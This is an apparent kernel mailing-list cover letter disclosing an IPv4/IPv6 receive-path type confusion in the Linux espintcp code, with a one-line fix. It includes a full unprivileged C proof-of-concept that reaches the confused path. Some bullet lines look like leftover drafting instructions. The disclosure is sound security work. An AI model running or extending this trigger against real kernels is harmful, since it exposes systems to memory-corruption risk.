Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.214.179
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794844359;
	b=gzrrD3sykUjULCJ1+9etEaUIb5yyN3pNcQZwU3QXGcyWh4hhPGKGnT8s/01C72VaWAuc
	 bVrlJhC2/jHV1Em+dEDtpEw9+Azjns63tbrt0uWxe14TK4g9aehFWGiTImHMD8YzYyWls
	 QvbI8RJhPrVr3PyC1yIDHyGDaUt9fsXeYJzwfAwBb5x5wmDijtWgxShe8O/ywz3p1eqYc
	 8loKJVBH/sGRr3H0az7yO4ygdtNiFkDupbszJqoqRWOB2Cu582rtWAZRlk8BF6TgIAKEO
	 N82YGdprD4w5aLIR47XoV3ouyM0ejOu2eDOqribHPYoyLXmVRCh7smhrs1IyE5MSyiw==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794844359;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
	 Content-Transfer-Encoding;
	bh=Aie7OnYW5s3MbLq6+AFszxKXAlUetx4feY/OZFkf+LQ=;
	b=pO1uSKgs+KF2pLtRTmEOVbyEq7i1qmR7DFu0sq7Sk3Zg9MCh/bFFNh7Cf6TFv5MpO04T
	 rLw4fjFjnYF49C+LrQ1QOotmngfQ9qxms3pLMAbYDSx61/J563ergmBmhKRRxGQig+vTB
	 bwedZtDZb2a+lqXJBdzafH1UzA6ve/xtmYFcf7gL48g5FaTue9GTAf5n5WxCLhEmoAvr2
	 dVqz6HxZOOypTmRkp5WPA+uijkvSUBcnRt4hhzl56aZnA6vX49mi9+HOgKYQQ+CebqW/y
	 LW1FwTzAcyaRon4YKwt4BU5T7tj0BHjs8hijUw70h0VRI/QjfFMD2+zrYBI+X5+lkew==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=KiMGyBdg;
	arc=none smtp.remote-ip=209.85.214.179
Received: from mail-pl1-f179.google.com (mail-pl1-f179.google.com [209.85.214.179])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 86516606A32C
	for <ipsec@lists.linux.dev>; Mon, 16 Nov 2026 15:52:38 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 86516606A32C
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=KiMGyBdg
Received: by mail-pl1-f179.google.com with SMTP id d9443c01a7336-2e9eb579c0eso19907065ad.3
        for <ipsec@lists.linux.dev>; Mon, 16 Nov 2026 07:52:38 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1794844358; x=1795449158; darn=lists.linux.dev;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=Aie7OnYW5s3MbLq6+AFszxKXAlUetx4feY/OZFkf+LQ=;
        b=KiMGyBdgs+a/nirHI9gmoDqcPc4mJvI75PAsZ9yFxSP1zbU5//Tem88haodk2nG5JA
         hcPU/ErjwCxemsAoUb0fOkjfJddUv9JmUBrVPb0sTNQoSONA3M/VktE0VaNEHuwDFK35
         cwomhti7KXI/kDoRMPm/mKB6eLlZ8w5XHVtkVW1eLcdNSsnm4BxLO5rBa0a5Gh3e4eW5
         agc88tgBW5Mo6M5Rc0cP05SPzTGigRHX92LmAukf0fLcwAju/QvH/iFN3Jkhu/CHLFym
         uE6JecU8n+OckjBqzlGe7/1lJwW9u32YicB+09vZrAR3/6so86TqQjDFsrbKM2ave4xe
         SODQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1794844358; x=1795449158;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=Aie7OnYW5s3MbLq6+AFszxKXAlUetx4feY/OZFkf+LQ=;
        b=cIgQ62914FwENLLSpn/gKzpbH31RdXMnIcgSHTMp1XH+scGGOU52BkVgGI8NqHybPv
         TpAfWVom7YMIiEgY4ET/HadY1V62W4vxgUzC7bDjz59lxItIWFPpyVQ++ua/Ph/v8ZcD
         Xs7fYyfWoMqSUEHEhqBWTZ6GwAbocTmfJ8QIpRWAI7Dv7FUU7OQNZVKSkIRY1y73WaDf
         E8EKmXlecsPp/05iDwnmgdEXYr7MEzZLWtnBwCTA5ZPU5y+5okZF1moW1ScmAgsoPudK
         1aCUf6wLPVtQJfWApzQx0dvdiT5bVdkdbFnZw4enwL/molh9xiy5OAE6qKVtJY9TUjFz
         Vs2w==
X-Forwarded-Encrypted: i=1; AL+hErG2gz1i0YZylFx/K2L7XQbLdUE0xIbWhfJZGWC6P4CZhhuPZNmYpjYl12hNQ1PMv1fwOecSJg==@lists.linux.dev
X-Gm-Message-State: APuU4Z/mAHhBRNE273+w2HuV6LUOX56/Fd5EBK5E9ADI/kS8qmaQY75z
	1GLkDujtp45smGlY3nSBSpzmtvdoSAviMJM5PmS/xP3yeF6/o4svHxNUDDLS+LMxwWJ/
X-Gm-Gg: AZFdTZeGBnOhNxRIsx5Bz5nk6wFnW9KmPAokQbFW77EhoVElGugpQ5IJhyeEQK7cwJQ
	QWanLusWPG1BhJAtn0edLxZbCSGtp6YMiJ3d+vpASG9BvW3a9vcpMQ57pz2V/kNqBL6V8wjP8Rk
	2yU3rLu0WO8npA2P2HXVY0XWkXFkgMGzrvCC7FGkt8D+n32czB3r0eLr5gmyXcW0220sBV59CC1
	kCb6DirhsMjimXxKrbgHpfhilwM8eUT4Z4XF/+CH8IeIgPYfe84Btn2jW+p35MySmi9qmMI/woZ
	Db4BTUWNKhShWuCvONTKhy8PFg0GFffv22H8lYMbnj/rVATrZUZcm9m56xid25TFJkFJx8zbSYK
	kX40mL1BdzZnxrAQuygYYLwb/qUAErOnnJO3kPLdB+N03w5ZM1jPrbkxxbe4Z2UZTtGnOW0O1Rt
	sN/vBzkOAwFxgFbBiadL02la8CgPoXFHHLaYs54hHhZ9Hb74Q+3juXH/jLTB3lVKDTNv9owpli+
	ikrI2NsjRUdrQyambiX3b970OV8vcLhjFjyCCvKVRn5byrOly3VRf77C+87oPM8X2//DVwIlPwS
	EpMeYRDZTjGsqNgbe3r8oJwudIE7vhvJ/K7ZOecUKI83IwBIwACnw799OUfiHeE0f5pIVekPxIm
	WSF1h4to4GdAP/1wrtgoR
X-Received: by 2002:a17:903:9cc:b0:2ed:d1ff:fa91 with SMTP id d9443c01a7336-2ee0d666821mr106261195ad.10.1794844357525;
        Mon, 16 Nov 2026 07:52:37 -0800 (PST)
Received: from 24c857d0c3be.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2efd7a36504sm1330985ad.30.2026.11.16.07.52.33
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 16 Nov 2026 07:52:36 -0800 (PST)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org,
	ipsec@lists.linux.dev
Cc: steffen.klassert@secunet.com,
	herbert@gondor.apana.org.au,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	sd@queasysnail.net,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net 0/1] xfrm: espintcp: fix IPv4/IPv6 receive path confusion
Date: Mon, 16 Nov 2026 15:52:28 +0000
Message-ID: <20261116155229.318582-1-zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
X-Mailing-List: ipsec@lists.linux.dev
List-Id: <ipsec.lists.linux.dev>
List-Post: <mailto:ipsec@lists.linux.dev>
List-Help: <mailto:ipsec+help@lists.linux.dev>
List-Subscribe: <mailto:ipsec+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:ipsec+unsubscribe@lists.linux.dev>
List-Owner: <mailto:ipsec+owner@lists.linux.dev>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found an issue in net/xfrm/espintcp.c. An IPv6 dual-stack socket can accept
an IPv4 connection as a v4-mapped peer. The accepted socket remains AF_INET6,
but the received skb is IPv4. ESP-in-TCP selected the XFRM receive path from
the socket family and passed the IPv4 skb to xfrm6_rcv_encap(), where IPv4
header bytes were interpreted as an IPv6 header.

This patch selects the receive path from skb->protocol, matching the packet
family and preventing the type-confused IPv6 processing.

An LLM was used to help create this patch.

This bug is tracked at:
https://bugtracker.nebusec.ai/f/5016 (5016)

Bug details:

The vulnerable path is reachable by an unprivileged user using an AF_INET6
listener with IPV6_V6ONLY disabled, an IPv4 connection, and TCP_ULP=espintcp.
The historical supplied QEMU run observed xfrm6_rcv_encap() on the IPv4-backed
skb and an XfrmInNoStates increment; it did not produce a crash. The selected
origin/main baseline still contains the family-based dispatch. The fix is a
one-line protocol-based dispatch change.

Reproducer details:

- Use the static-build and unprivileged user/network-namespace commands in the
  reproducer instructions.
- Explain why a custom socket PoC is used instead of packetdrill.
- Include the observed normal output and tracing evidence, and explain why no
  crash-log exists.

Reproducer:

Build and run as an ordinary user in the guest:

    gcc -static -O2 -pthread poc.c -o poc
    unshare -Urn sh -c 'ip link set lo up; exec ./poc'

The custom C PoC is used because the trigger depends on AF_INET6 dual-stack
socket creation, v4-mapped accept state, and TCP_ULP=espintcp. Packetdrill
does not naturally express this socket API and ULP state combination.

Historical QEMU run output:

    accepted socket domain=10
    peer=::ffff:127.0.0.1 port=41512
    recv=0 errno=0

The historical tracing additionally showed:

    xfrm6_rcv_encap <-espintcp_rcv

and XfrmInNoStates increased by one (before=1004 after=1005 delta=1). The run
followed the no-state/error path without a KASAN report, oops, or crash-log,
so no crash-log is attached.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN PoC------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

static int port = 31338;
static volatile int ready;

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

static void *server_thread(void *arg)
{
	int ls = socket(AF_INET6, SOCK_STREAM, 0);
	int zero = 0, one = 1;
	struct sockaddr_in6 addr = {0};
	struct sockaddr_storage peer;
	struct sockaddr_in6 peer6 = {0};
	socklen_t peerlen = sizeof(peer);
	socklen_t peer6len = sizeof(peer6);
	char ulp[] = "espintcp";
	char addrbuf[INET6_ADDRSTRLEN];
	char rx[128];
	int as;
	int fam;
	socklen_t flen = sizeof(fam);
	ssize_t n;

	(void)arg;

	if (ls < 0)
		die("socket(AF_INET6)");
	if (setsockopt(ls, IPPROTO_IPV6, IPV6_V6ONLY, &zero, sizeof(zero)) < 0)
		die("setsockopt(IPV6_V6ONLY=0)");
	if (setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
		die("setsockopt(SO_REUSEADDR)");

	addr.sin6_family = AF_INET6;
	addr.sin6_port = htons(port);
	addr.sin6_addr = in6addr_any;
	if (bind(ls, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind");
	if (listen(ls, 1) < 0)
		die("listen");

	__atomic_store_n(&ready, 1, __ATOMIC_SEQ_CST);

	as = accept(ls, (struct sockaddr *)&peer, &peerlen);
	if (as < 0)
		die("accept");

	if (getsockopt(as, SOL_SOCKET, SO_DOMAIN, &fam, &flen) < 0)
		die("getsockopt(SO_DOMAIN)");
	fprintf(stderr, "accepted socket domain=%d\n", fam);

	if (getpeername(as, (struct sockaddr *)&peer6, &peer6len) < 0)
		die("getpeername");
	if (!inet_ntop(AF_INET6, &peer6.sin6_addr, addrbuf, sizeof(addrbuf)))
		die("inet_ntop");
	fprintf(stderr, "peer=%s port=%u\n", addrbuf, ntohs(peer6.sin6_port));

	if (setsockopt(as, IPPROTO_TCP, TCP_ULP, ulp, sizeof(ulp)) < 0)
		die("setsockopt(TCP_ULP=espintcp)");

	n = recv(as, rx, sizeof(rx), 0);
	fprintf(stderr, "recv=%zd errno=%d\n", n, errno);

	close(as);
	close(ls);
	return NULL;
}

int main(void)
{
	pthread_t th;
	int cs;
	struct sockaddr_in a = {0};
	unsigned char msg[10] = {
		0x00, 0x0a,
		0x12, 0x34, 0x56, 0x78,
		0xaa, 0xbb, 0xcc, 0xdd,
	};

	if (pthread_create(&th, NULL, server_thread, NULL) != 0)
		die("pthread_create");

	while (!__atomic_load_n(&ready, __ATOMIC_SEQ_CST))
		sched_yield();

	cs = socket(AF_INET, SOCK_STREAM, 0);
	if (cs < 0)
		die("socket(AF_INET)");

	a.sin_family = AF_INET;
	a.sin_port = htons(port);
	if (inet_pton(AF_INET, "127.0.0.1", &a.sin_addr) != 1)
		die("inet_pton");
	if (connect(cs, (struct sockaddr *)&a, sizeof(a)) < 0)
		die("connect");

	if (send(cs, msg, sizeof(msg), 0) < 0)
		die("send");

	close(cs);
	pthread_join(th, NULL);
	return 0;
}

------END PoC--------

Best regards,
Zihan Xi

Zihan Xi (1):
  xfrm: espintcp: select receive path by skb protocol

 net/xfrm/espintcp.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

-- 
2.43.0

